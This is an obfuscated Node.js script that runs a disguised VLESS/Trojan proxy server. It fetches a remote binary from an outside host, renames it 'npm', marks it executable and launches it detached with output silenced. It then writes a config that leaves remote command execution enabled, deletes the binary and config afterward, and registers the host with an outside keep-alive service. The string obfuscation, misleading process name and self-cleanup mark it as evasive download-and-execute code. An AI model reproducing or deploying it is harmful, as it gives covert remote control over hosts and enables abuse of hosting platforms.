const _0x541fcf=_0x1115;(function(_0xf2ede4,_0x378537){const _0xe8978b=_0x1115,_0x302e3c=_0xf2ede4();while(!![]){try{const _0x208616=parseInt(_0xe8978b(0xf9))/0x1*(-parseInt(_0xe8978b(0x117))/0x2)+-parseInt(_0xe8978b(0x125))/0x3*(parseInt(_0xe8978b(0xf6))/0x4)+-parseInt(_0xe8978b(0x11c))/0x5+-parseInt(_0xe8978b(0x122))/0x6*(-parseInt(_0xe8978b(0xdf))/0x7)+-parseInt(_0xe8978b(0xba))/0x8+-parseInt(_0xe8978b(0x110))/0x9+parseInt(_0xe8978b(0xc5))/0xa;if(_0x208616===_0x378537)break;else _0x302e3c['push'](_0x302e3c['shift']());}catch(_0x11100c){_0x302e3c['push'](_0x302e3c['shift']());}}}(_0x4bd5,0x65656));const os=require('os'),http=require(_0x541fcf(0x102)),fs=require('fs'),axios=require(_0x541fcf(0xdd)),net=require(_0x541fcf(0xbd)),path=require(_0x541fcf(0x104)),crypto=require('crypto'),{Buffer}=require(_0x541fcf(0x108)),{exec,execSync}=require(_0x541fcf(0xfb)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x541fcf(0xcc)][_0x541fcf(0xfd)]||'e5b5550f-b566-496f-bdbc-25c2c59d6f65',NEZHA_SERVER=process[_0x541fcf(0xcc)][_0x541fcf(0xe1)]||'',NEZHA_PORT=process[_0x541fcf(0xcc)][_0x541fcf(0xbe)]||'',NEZHA_KEY=process[_0x541fcf(0xcc)]['NEZHA_KEY']||'',DOMAIN=process[_0x541fcf(0xcc)][_0x541fcf(0xbb)]||'1234.abc.com',AUTO_ACCESS=process[_0x541fcf(0xcc)]['AUTO_ACCESS']||!![],WSPATH=process[_0x541fcf(0xcc)][_0x541fcf(0xf4)]||UUID['slice'](0x0,0x8),SUB_PATH=process[_0x541fcf(0xcc)][_0x541fcf(0xe9)]||_0x541fcf(0x12a),NAME=process[_0x541fcf(0xcc)][_0x541fcf(0xe3)]||'Hug',PORT=process[_0x541fcf(0xcc)][_0x541fcf(0x10f)]||0x1eb4;function _0x4bd5(){const _0x372006=['\x20-p\x20','trim','chmod\x20+x\x20npm','slice','axios','close','161cYdByC','Not\x20Found\x0a','NEZHA_SERVER','readFile','NAME','Status','https://amd64.ssss.nyc.mn/v1','connection','createHash','then','SUB_PATH','443','index.html','post','decode','--tls','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','sha224','https://arm64.ssss.nyc.mn/v1','find','concat','WSPATH','includes','4dwpaUG','pipe','log','1033oOEAIb','&path=%2F','child_process','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','UUID','finish','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','data','substr','http','send','path','message','npm','base64','buffer','get','write','replace','test','Answer','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','PORT','5249943FrhapJ','stream','1.1.1.1','Server\x20is\x20running\x20on\x20port\x20','config.yaml','end','readUInt16BE','888udBpIc','npm\x20is\x20running','createServer','writeHead','every','3266925aiYvJQ','npm\x20running\x20error:','utf8','Failed\x20to\x20resolve\x20','type','setsid\x20nohup\x20./npm\x20-s\x20','124518pxjhrv','asOrganization','join','909111eBLiXw','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','&fp=chrome&type=ws&host=','map','2087','aa123123@e','reduce','3975744uhasBm','DOMAIN','connect','net','NEZHA_PORT','https://amd64.ssss.nyc.mn/agent','client_secret:\x20','text/plain','false','url','catch','24333680qCqbRr','arm64','from','readUInt8','error','npm\x20download\x20successfully','listen','env','length','arch','hex','Hello\x20world!','https://arm64.ssss.nyc.mn/agent','2096','application/json','text/html','unlink','Unknown','toString','createWriteStream'];_0x4bd5=function(){return _0x372006;};return _0x4bd5();}let ISP='';const GetISP=async()=>{const _0x5f0d70=_0x541fcf;try{const _0x5d8caa=await axios[_0x5f0d70(0x109)]('https://speed.cloudflare.com/meta'),_0x3b5b70=_0x5d8caa[_0x5f0d70(0x100)];ISP=(_0x3b5b70['country']+'-'+_0x3b5b70[_0x5f0d70(0x123)])[_0x5f0d70(0x10b)](/ /g,'_');}catch(_0x1a12e8){ISP=_0x5f0d70(0xd6);}};GetISP();const httpServer=http[_0x541fcf(0x119)]((_0x3bff35,_0x30455d)=>{const _0x70ebe9=_0x541fcf;if(_0x3bff35[_0x70ebe9(0xc3)]==='/'){const _0x67261b=path[_0x70ebe9(0x124)](__dirname,_0x70ebe9(0xeb));fs[_0x70ebe9(0xe2)](_0x67261b,_0x70ebe9(0x11e),(_0x542f06,_0x30df60)=>{const _0x2a9d21=_0x70ebe9;if(_0x542f06){_0x30455d[_0x2a9d21(0x11a)](0xc8,{'Content-Type':_0x2a9d21(0xd4)}),_0x30455d[_0x2a9d21(0x115)](_0x2a9d21(0xd0));return;}_0x30455d[_0x2a9d21(0x11a)](0xc8,{'Content-Type':_0x2a9d21(0xd4)}),_0x30455d[_0x2a9d21(0x115)](_0x30df60);});return;}else{if(_0x3bff35[_0x70ebe9(0xc3)]==='/'+SUB_PATH){const _0x367d0b='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x70ebe9(0x127)+DOMAIN+_0x70ebe9(0xfa)+WSPATH+'#'+NAME+'-'+ISP,_0x2b5e97='trojan://'+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x70ebe9(0x127)+DOMAIN+'&path=%2F'+WSPATH+'#'+NAME+'-'+ISP,_0x441f42=_0x367d0b+'\x0a'+_0x2b5e97,_0x3029f7=Buffer[_0x70ebe9(0xc7)](_0x441f42)[_0x70ebe9(0xd7)](_0x70ebe9(0x107));_0x30455d['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x30455d[_0x70ebe9(0x115)](_0x3029f7+'\x0a');}else _0x30455d[_0x70ebe9(0x11a)](0x194,{'Content-Type':_0x70ebe9(0xc1)}),_0x30455d[_0x70ebe9(0x115)](_0x70ebe9(0xe0));}}),wss=new WebSocket['Server']({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=['8.8.4.4',_0x541fcf(0x112)];function _0x1115(_0x2ecec1,_0x78071f){_0x2ecec1=_0x2ecec1-0xb9;const _0x4bd57b=_0x4bd5();let _0x1115e5=_0x4bd57b[_0x2ecec1];return _0x1115e5;}function resolveHost(_0xc3bb35){return new Promise((_0x1eea32,_0x475eee)=>{const _0x2c53d4=_0x1115;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x2c53d4(0x10c)](_0xc3bb35)){_0x1eea32(_0xc3bb35);return;}let _0x341df7=0x0;function _0x56b552(){const _0x8591a=_0x2c53d4;if(_0x341df7>=DNS_SERVERS[_0x8591a(0xcd)]){_0x475eee(new Error(_0x8591a(0x11f)+_0xc3bb35+'\x20with\x20all\x20DNS\x20servers'));return;}const _0x3db013=DNS_SERVERS[_0x341df7];_0x341df7++;const _0x250844='https://dns.google/resolve?name='+encodeURIComponent(_0xc3bb35)+'&type=A';axios['get'](_0x250844,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x8591a(0xe8)](_0x3e4295=>{const _0x582552=_0x8591a,_0xaabdd8=_0x3e4295['data'];if(_0xaabdd8[_0x582552(0xe4)]===0x0&&_0xaabdd8[_0x582552(0x10d)]&&_0xaabdd8[_0x582552(0x10d)][_0x582552(0xcd)]>0x0){const _0x2fb2d3=_0xaabdd8[_0x582552(0x10d)][_0x582552(0xf2)](_0x21857c=>_0x21857c[_0x582552(0x120)]===0x1);if(_0x2fb2d3){_0x1eea32(_0x2fb2d3['data']);return;}}_0x56b552();})[_0x8591a(0xc4)](_0x2680cf=>{_0x56b552();});}_0x56b552();});}function handleVlessConnection(_0x46d723,_0x22f4cb){const _0x5d3997=_0x541fcf,[_0x48bbb9]=_0x22f4cb,_0x5631fc=_0x22f4cb['slice'](0x1,0x11);if(!_0x5631fc[_0x5d3997(0x11b)]((_0x5950e8,_0x18289d)=>_0x5950e8==parseInt(uuid[_0x5d3997(0x101)](_0x18289d*0x2,0x2),0x10)))return![];let _0x5bda34=_0x22f4cb[_0x5d3997(0xdc)](0x11,0x12)['readUInt8']()+0x13;const _0x5ae689=_0x22f4cb['slice'](_0x5bda34,_0x5bda34+=0x2)['readUInt16BE'](0x0),_0x57dc3c=_0x22f4cb[_0x5d3997(0xdc)](_0x5bda34,_0x5bda34+=0x1)[_0x5d3997(0xc8)](),_0xc365a3=_0x57dc3c==0x1?_0x22f4cb[_0x5d3997(0xdc)](_0x5bda34,_0x5bda34+=0x4)[_0x5d3997(0x124)]('.'):_0x57dc3c==0x2?new TextDecoder()[_0x5d3997(0xed)](_0x22f4cb['slice'](_0x5bda34+0x1,_0x5bda34+=0x1+_0x22f4cb['slice'](_0x5bda34,_0x5bda34+0x1)['readUInt8']())):_0x57dc3c==0x3?_0x22f4cb['slice'](_0x5bda34,_0x5bda34+=0x10)['reduce']((_0x27caa1,_0x2528fa,_0x207978,_0x2de934)=>_0x207978%0x2?_0x27caa1[_0x5d3997(0xf3)](_0x2de934[_0x5d3997(0xdc)](_0x207978-0x1,_0x207978+0x1)):_0x27caa1,[])[_0x5d3997(0x128)](_0x1d3104=>_0x1d3104['readUInt16BE'](0x0)[_0x5d3997(0xd7)](0x10))[_0x5d3997(0x124)](':'):'';_0x46d723[_0x5d3997(0x103)](new Uint8Array([_0x48bbb9,0x0]));const _0x571f8d=createWebSocketStream(_0x46d723);return resolveHost(_0xc365a3)[_0x5d3997(0xe8)](_0x1608aa=>{const _0x473ed0=_0x5d3997;net[_0x473ed0(0xbc)]({'host':_0x1608aa,'port':_0x5ae689},function(){const _0x75c16d=_0x473ed0;this[_0x75c16d(0x10a)](_0x22f4cb[_0x75c16d(0xdc)](_0x5bda34)),_0x571f8d['on'](_0x75c16d(0xc9),()=>{})[_0x75c16d(0xf7)](this)['on']('error',()=>{})['pipe'](_0x571f8d);})['on']('error',()=>{});})[_0x5d3997(0xc4)](_0x36a52a=>{const _0x562f82=_0x5d3997;net[_0x562f82(0xbc)]({'host':_0xc365a3,'port':_0x5ae689},function(){const _0x58bf73=_0x562f82;this[_0x58bf73(0x10a)](_0x22f4cb['slice'](_0x5bda34)),_0x571f8d['on'](_0x58bf73(0xc9),()=>{})[_0x58bf73(0xf7)](this)['on'](_0x58bf73(0xc9),()=>{})[_0x58bf73(0xf7)](_0x571f8d);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x22310c,_0x3fd408){const _0x549237=_0x541fcf;try{if(_0x3fd408['length']<0x3a)return![];const _0x3468f2=_0x3fd408[_0x549237(0xdc)](0x0,0x38)['toString'](),_0x5701be=[UUID];let _0x318296=null;for(const _0x5cddfd of _0x5701be){const _0x22e68a=crypto[_0x549237(0xe7)](_0x549237(0xf0))['update'](_0x5cddfd)['digest'](_0x549237(0xcf));if(_0x22e68a===_0x3468f2){_0x318296=_0x5cddfd;break;}}if(!_0x318296)return![];let _0x13034=0x38;_0x3fd408[_0x13034]===0xd&&_0x3fd408[_0x13034+0x1]===0xa&&(_0x13034+=0x2);const _0x296e84=_0x3fd408[_0x13034];if(_0x296e84!==0x1)return![];_0x13034+=0x1;const _0x6bb885=_0x3fd408[_0x13034];_0x13034+=0x1;let _0x3f50b4,_0x160947;if(_0x6bb885===0x1)_0x3f50b4=_0x3fd408[_0x549237(0xdc)](_0x13034,_0x13034+0x4)[_0x549237(0x124)]('.'),_0x13034+=0x4;else{if(_0x6bb885===0x3){const _0x3971d0=_0x3fd408[_0x13034];_0x13034+=0x1,_0x3f50b4=_0x3fd408[_0x549237(0xdc)](_0x13034,_0x13034+_0x3971d0)[_0x549237(0xd7)](),_0x13034+=_0x3971d0;}else{if(_0x6bb885===0x4)_0x3f50b4=_0x3fd408[_0x549237(0xdc)](_0x13034,_0x13034+0x10)[_0x549237(0xb9)]((_0x39c82,_0x2ce4fe,_0x57bc66,_0x2b1ecf)=>_0x57bc66%0x2?_0x39c82['concat'](_0x2b1ecf['slice'](_0x57bc66-0x1,_0x57bc66+0x1)):_0x39c82,[])[_0x549237(0x128)](_0x9972b=>_0x9972b[_0x549237(0x116)](0x0)[_0x549237(0xd7)](0x10))[_0x549237(0x124)](':'),_0x13034+=0x10;else return![];}}_0x160947=_0x3fd408[_0x549237(0x116)](_0x13034),_0x13034+=0x2;_0x13034<_0x3fd408[_0x549237(0xcd)]&&_0x3fd408[_0x13034]===0xd&&_0x3fd408[_0x13034+0x1]===0xa&&(_0x13034+=0x2);const _0x53e5d4=createWebSocketStream(_0x22310c);return resolveHost(_0x3f50b4)[_0x549237(0xe8)](_0x262a40=>{const _0x4fd58c=_0x549237;net['connect']({'host':_0x262a40,'port':_0x160947},function(){const _0xeac0f9=_0x1115;_0x13034<_0x3fd408[_0xeac0f9(0xcd)]&&this[_0xeac0f9(0x10a)](_0x3fd408[_0xeac0f9(0xdc)](_0x13034)),_0x53e5d4['on'](_0xeac0f9(0xc9),()=>{})[_0xeac0f9(0xf7)](this)['on'](_0xeac0f9(0xc9),()=>{})['pipe'](_0x53e5d4);})['on'](_0x4fd58c(0xc9),()=>{});})[_0x549237(0xc4)](_0x30052e=>{const _0xc0af63=_0x549237;net[_0xc0af63(0xbc)]({'host':_0x3f50b4,'port':_0x160947},function(){const _0x2c91ca=_0xc0af63;_0x13034<_0x3fd408[_0x2c91ca(0xcd)]&&this['write'](_0x3fd408['slice'](_0x13034)),_0x53e5d4['on'](_0x2c91ca(0xc9),()=>{})[_0x2c91ca(0xf7)](this)['on'](_0x2c91ca(0xc9),()=>{})['pipe'](_0x53e5d4);})['on'](_0xc0af63(0xc9),()=>{});}),!![];}catch(_0xad89f){return![];}}wss['on'](_0x541fcf(0xe6),(_0x398a3f,_0x172b8e)=>{const _0x5360f7=_0x541fcf,_0x40efe0=_0x172b8e['url']||'';_0x398a3f['once'](_0x5360f7(0x105),_0x57e736=>{const _0x2b00fa=_0x5360f7;if(_0x57e736['length']>0x11&&_0x57e736[0x0]===0x0){const _0x3bfa79=_0x57e736[_0x2b00fa(0xdc)](0x1,0x11),_0x3607b0=_0x3bfa79[_0x2b00fa(0x11b)]((_0xca4297,_0x1d1d69)=>_0xca4297==parseInt(uuid['substr'](_0x1d1d69*0x2,0x2),0x10));if(_0x3607b0){!handleVlessConnection(_0x398a3f,_0x57e736)&&_0x398a3f[_0x2b00fa(0xde)]();return;}}!handleTrojanConnection(_0x398a3f,_0x57e736)&&_0x398a3f[_0x2b00fa(0xde)]();})['on'](_0x5360f7(0xc9),()=>{});});const getDownloadUrl=()=>{const _0x21b8d9=_0x541fcf,_0x48ce0a=os[_0x21b8d9(0xce)]();return _0x48ce0a==='arm'||_0x48ce0a===_0x21b8d9(0xc6)||_0x48ce0a==='aarch64'?!NEZHA_PORT?_0x21b8d9(0xf1):_0x21b8d9(0xd1):!NEZHA_PORT?_0x21b8d9(0xe5):_0x21b8d9(0xbf);},downloadFile=async()=>{const _0x4a2a1f=_0x541fcf;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x268708=getDownloadUrl(),_0x20c351=await axios({'method':_0x4a2a1f(0x109),'url':_0x268708,'responseType':_0x4a2a1f(0x111)}),_0x3b4549=fs[_0x4a2a1f(0xd8)](_0x4a2a1f(0x106));return _0x20c351['data']['pipe'](_0x3b4549),new Promise((_0x1fbc4f,_0x103dd1)=>{const _0x229adf=_0x4a2a1f;_0x3b4549['on'](_0x229adf(0xfe),()=>{const _0x1bc784=_0x229adf;console[_0x1bc784(0xf8)](_0x1bc784(0xca)),exec(_0x1bc784(0xdb),_0x432132=>{if(_0x432132)_0x103dd1(_0x432132);_0x1fbc4f();});}),_0x3b4549['on']('error',_0x103dd1);});}catch(_0x1c1cbf){throw _0x1c1cbf;}},runnz=async()=>{const _0x6fdf9f=_0x541fcf;try{const _0x59b9b4=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':'utf-8'});if(_0x59b9b4[_0x6fdf9f(0xda)]()!==''){console[_0x6fdf9f(0xf8)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x38182c){}await downloadFile();let _0x2745ab='',_0x1a429f=[_0x6fdf9f(0xea),'8443',_0x6fdf9f(0xd2),_0x6fdf9f(0x129),'2083','2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x47bf32=_0x1a429f[_0x6fdf9f(0xf5)](NEZHA_PORT)?_0x6fdf9f(0xee):'';_0x2745ab=_0x6fdf9f(0x121)+NEZHA_SERVER+':'+NEZHA_PORT+_0x6fdf9f(0xd9)+NEZHA_KEY+'\x20'+_0x47bf32+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x356502=NEZHA_SERVER['includes'](':')?NEZHA_SERVER['split'](':')['pop']():'',_0x44ee1e=_0x1a429f[_0x6fdf9f(0xf5)](_0x356502)?'true':_0x6fdf9f(0xc2),_0x3f6ce1=_0x6fdf9f(0xc0)+NEZHA_KEY+_0x6fdf9f(0x126)+NEZHA_SERVER+_0x6fdf9f(0xff)+_0x44ee1e+_0x6fdf9f(0xef)+UUID;fs['writeFileSync'](_0x6fdf9f(0x114),_0x3f6ce1);}_0x2745ab=_0x6fdf9f(0xfc);}else{console[_0x6fdf9f(0xf8)](_0x6fdf9f(0x10e));return;}}try{exec(_0x2745ab,{'shell':'/bin/bash'},_0x3d36b6=>{const _0x1935c1=_0x6fdf9f;if(_0x3d36b6)console[_0x1935c1(0xc9)](_0x1935c1(0x11d),_0x3d36b6);else console[_0x1935c1(0xf8)](_0x1935c1(0x118));});}catch(_0x26ebaf){console[_0x6fdf9f(0xc9)]('error:\x20'+_0x26ebaf);}};async function addAccessTask(){const _0x3b3adc=_0x541fcf;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x45421a='https://'+DOMAIN;try{const _0x289b5c=await axios[_0x3b3adc(0xec)]('https://oooo.serv00.net/add-url',{'url':_0x45421a},{'headers':{'Content-Type':_0x3b3adc(0xd3)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x4d6385){}}const delFiles=()=>{const _0x700993=_0x541fcf;fs[_0x700993(0xd5)](_0x700993(0x106),()=>{}),fs[_0x700993(0xd5)](_0x700993(0x114),()=>{});};httpServer[_0x541fcf(0xcb)](PORT,()=>{const _0x339ad1=_0x541fcf;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x339ad1(0xf8)](_0x339ad1(0x113)+PORT);});
